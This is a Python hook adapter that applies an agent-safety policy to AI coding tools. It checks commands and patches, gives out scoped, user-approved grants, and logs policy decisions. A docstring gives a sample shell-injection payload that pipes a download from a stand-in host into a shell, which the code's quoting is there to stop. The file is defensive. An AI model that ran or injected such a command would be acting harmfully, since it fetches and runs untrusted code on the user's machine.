#!/usr/bin/env python3
"""Hook adapter for Claude Code, Codex, and Augment."""
from __future__ import annotations

import argparse
import json
import shlex
import sys
from pathlib import Path

try:
    from scripts.agent_policy.friction import append_event
    from scripts.agent_policy.grants import (
        Grant,
        consume_matching_grants,
        load_grants,
        patch_paths_from,
        prune_session,
        save_grants,
    )
    from scripts.agent_policy.policy import (
        PolicyDecision,
        command_summary,
        evaluate_command,
        evaluate_stop,
        record_test_command,
        scan_patch,
        strongest_decision,
    )
except ModuleNotFoundError:
    sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
    from scripts.agent_policy.friction import append_event
    from scripts.agent_policy.grants import (
        Grant,
        consume_matching_grants,
        load_grants,
        patch_paths_from,
        prune_session,
        save_grants,
    )
    from scripts.agent_policy.policy import (
        PolicyDecision,
        command_summary,
        evaluate_command,
        evaluate_stop,
        record_test_command,
        scan_patch,
        strongest_decision,
    )


def handle_event(tool: str, event: str, payload: dict) -> tuple[int, dict]:
    if event == "PreToolUse":
        command = extract_command(payload)
        decisions: list[PolicyDecision] = list(evaluate_command(command)) if command else []
        patch_text = extract_patch_text(payload)
        tool_input = extract_tool_input(payload)
        decisions.extend(scan_patch(patch_text, tool_input))

        session_id = extract_session_id(payload)
        patch_paths = patch_paths_from(patch_text, tool_input)
        matches, expired = consume_matching_grants(
            rule_ids=[d.rule_id for d in decisions],
            command=command,
            patch_paths=patch_paths,
            session_id=session_id,
        )
        for expired_grant in expired:
            log_grant_event(expired_grant, "grant_expired", tool, event)
        remaining: list[PolicyDecision] = []
        for policy_decision in decisions:
            grant = matches.get(policy_decision.rule_id)
            if grant is not None:
                log_grant_consumed(policy_decision, grant, tool, event)
            else:
                log_decision(policy_decision, tool, event)
                remaining.append(policy_decision)
        decision = strongest_decision(remaining)
        return 0, render_output(
            tool,
            event,
            decision,
            command=command,
            session_id=session_id,
            patch_paths=patch_paths,
        )

    if event == "PostToolUse":
        command = extract_command(payload)
        if command:
            record_test_command(command, success=tool_succeeded(payload))
        return 0, {}

    if event == "Stop":
        last_message = extract_last_message(payload)
        changed_files = payload.get("changed_files") or _changed_files_from_conversation(payload)
        decisions = evaluate_stop(changed_files=changed_files, last_message=last_message)
        for policy_decision in decisions:
            log_decision(policy_decision, tool, event)
        decision = strongest_decision(decisions)
        prune_session_grants(extract_session_id(payload), tool, event)
        return 0, render_output(tool, event, decision)

    return 0, {}


def extract_tool_input(payload: dict) -> dict:
    value = payload.get("tool_input") or payload.get("input") or {}
    if isinstance(value, dict):
        return value
    if isinstance(value, str):
        return {"content": value}
    return {}


def extract_command(payload: dict) -> str:
    tool_input = extract_tool_input(payload)
    for key in ("command", "cmd", "shellInput", "shell_input"):
        if tool_input.get(key):
            return str(tool_input[key])
    return ""


def extract_patch_text(payload: dict) -> str:
    tool_input = extract_tool_input(payload)
    return "\n".join(
        str(tool_input[key])
        for key in ("command", "patch", "content", "new_string")
        if tool_input.get(key)
    )


def tool_succeeded(payload: dict) -> bool:
    if payload.get("tool_error"):
        return False
    response = payload.get("tool_response") or payload.get("tool_output") or {}
    if isinstance(response, dict):
        if response.get("is_error") or response.get("isError") or response.get("error"):
            return False
        if response.get("interrupted") is True:
            return False
        for key in ("exit_code", "returncode", "status_code"):
            if key in response:
                return response[key] in (0, "0")
        status = str(response.get("status", "")).lower()
        if status in {"error", "failed", "failure"}:
            return False
    return True


def extract_last_message(payload: dict) -> str:
    if payload.get("last_assistant_message"):
        return str(payload["last_assistant_message"])
    conversation = payload.get("conversation")
    if isinstance(conversation, dict):
        return str(conversation.get("agentTextResponse") or "")
    return ""


def _changed_files_from_conversation(payload: dict) -> list[str]:
    conversation = payload.get("conversation")
    if not isinstance(conversation, dict):
        return []
    changes = conversation.get("agentCodeResponse")
    if not isinstance(changes, list):
        return []
    return [
        str(change["path"])
        for change in changes
        if isinstance(change, dict) and change.get("path")
    ]


def log_decision(decision: PolicyDecision, tool: str, event: str) -> None:
    append_event(**decision.to_record(tool=tool, event=event))


def extract_session_id(payload: dict) -> str:
    for key in ("session_id", "sessionId"):
        value = payload.get(key)
        if value:
            return str(value)
    return ""


def log_grant_consumed(
    decision: PolicyDecision, grant: Grant, tool: str, event: str
) -> None:
    append_event(
        rule_id=decision.rule_id,
        decision="grant_consumed",
        reason=f"Allowed by grant {grant.id}: {grant.reason}",
        summary=decision.summary,
        tool=tool,
        event=event,
        source="automatic",
    )


def log_grant_event(grant: Grant, decision: str, tool: str, event: str) -> None:
    append_event(
        rule_id=grant.rule_id,
        decision=decision,
        reason=f"{decision} for grant {grant.id}",
        summary=f"scope={grant.scope_kind} reason={grant.reason}",
        tool=tool,
        event=event,
        source="automatic",
    )


def prune_session_grants(session_id: str, tool: str, event: str) -> None:
    if not session_id:
        return
    grants = load_grants()
    kept, dropped = prune_session(grants, session_id)
    if not dropped:
        return
    save_grants(kept)
    for grant in dropped:
        log_grant_event(grant, "grant_expired", tool, event)


def render_output(
    tool: str,
    event: str,
    decision: PolicyDecision | None,
    *,
    command: str = "",
    session_id: str = "",
    patch_paths: list[str] | None = None,
) -> dict:
    if not decision:
        return {}
    reason = _reason_with_escape_hatch(
        decision,
        command=command,
        session_id=session_id,
        patch_paths=patch_paths or [],
    )
    if tool == "claude":
        if event == "PreToolUse":
            return _permission_payload(event, decision.decision, reason)
        if event == "Stop" and decision.decision == "block":
            return {"decision": "block", "reason": reason}
        return {"systemMessage": reason}

    if tool == "codex":
        if decision.decision == "block":
            return {"decision": "block", "reason": reason}
        return _additional_context_payload(event, reason)

    if tool == "augment":
        if event == "PreToolUse":
            return _permission_payload(event, decision.decision, reason)
        if event == "Stop" and decision.decision == "block":
            return {
                "hookSpecificOutput": {
                    "hookEventName": event,
                    "decision": "block",
                    "reason": reason,
                }
            }
        return _additional_context_payload(event, reason)

    return {"decision": decision.decision, "reason": reason}


_DECISION_TO_PERMISSION = {"block": "deny", "ask": "ask", "warn": "allow"}


def _permission_payload(event: str, decision: str, reason: str) -> dict:
    return {
        "hookSpecificOutput": {
            "hookEventName": event,
            "permissionDecision": _DECISION_TO_PERMISSION.get(decision, "allow"),
            "permissionDecisionReason": reason,
        }
    }


def _additional_context_payload(event: str, reason: str) -> dict:
    return {
        "hookSpecificOutput": {
            "hookEventName": event,
            "additionalContext": reason,
        }
    }


def _reason_with_escape_hatch(
    decision: PolicyDecision,
    *,
    command: str = "",
    session_id: str = "",
    patch_paths: list[str] | None = None,
) -> str:
    rule = decision.rule_id
    pattern_hint = _suggest_pattern(rule, command, patch_paths or [])
    session_hint = (
        f" --session-id {session_id}" if session_id else " --session-id <session-id>"
    )
    grant_block = (
        "\n\n(A) Get a temporary, scoped grant — recommended for one-off authorization:\n"
        f"    python3 scripts/agent_policy/grant.py grant \\\n"
        f"      --rule {rule} --duration 2h \\\n"
        f"      {pattern_hint} --reason \"<why>\" \\\n"
        "      --granted-by agent_after_user_approval --approval-quote \"<user's words>\"\n"
        f"    Other scopes: --once  |  --session{session_hint}\n"
    )
    friction_block = (
        "\n(B) Report long-term friction — if this rule blocks too often in general:\n"
        f"    python3 scripts/agent_policy/friction.py report --rule {rule} "
        "--message \"<why>\""
    )
    return (
        f"{decision.reason} [rule: {rule}]"
        f"{grant_block}{friction_block}"
    )


def _suggest_pattern(rule: str, command: str, patch_paths: list[str]) -> str:
    """Build a copy-pasteable narrowing flag, shell-quoting user-controlled input.

    The returned string is interpolated into a multi-line bash hint that
    the agent is invited to execute. Interpolating the raw command would
    let an attacker-controlled tool input inject extra shell tokens
    (e.g. ``"; curl evil.sh|sh #``). shlex.quote keeps the suggestion to
    a single shell word.
    """
    if rule.startswith("patch.") and patch_paths:
        head = patch_paths[0]
        prefix = "/".join(head.split("/")[:-1])
        suggestion = f"{prefix}/**" if prefix else head
        return f"--path-glob {shlex.quote(suggestion)}"
    if command:
        tokens = command.strip().split()
        narrow = " ".join(tokens[:3]) if tokens else command[:40]
        return f"--pattern {shlex.quote(narrow)}"
    return "--pattern '<narrow command pattern>'"


def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser(description="Run an agent-policy hook")
    parser.add_argument("--tool", choices=("claude", "codex", "augment"), required=True)
    parser.add_argument("--event", choices=("PreToolUse", "PostToolUse", "Stop"), required=True)
    args = parser.parse_args(argv)
    raw = sys.stdin.read()
    try:
        payload = json.loads(raw or "{}")
    except json.JSONDecodeError as exc:
        # Stop only honors `block`; PreToolUse honors `ask`; PostToolUse has
        # no enforcement semantic, so emit `warn` (renders as systemMessage).
        gate = {"Stop": "block", "PreToolUse": "ask"}.get(args.event, "warn")
        decision = PolicyDecision(
            rule_id="hook.payload_unparseable",
            decision=gate,
            reason=f"Hook payload could not be parsed as JSON: {exc}",
            # command_summary handles the project's standard credential
            # redaction (api keys, sk- tokens, 48+ char tokens) before the
            # forensic excerpt lands in friction.jsonl.
            summary=command_summary(raw) if raw else "<empty>",
        )
        log_decision(decision, args.tool, args.event)
        output = render_output(args.tool, args.event, decision)
        if output:
            print(json.dumps(output, sort_keys=True))
        return 0
    status, output = handle_event(args.tool, args.event, payload)
    if output:
        print(json.dumps(output, sort_keys=True))
    return status


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
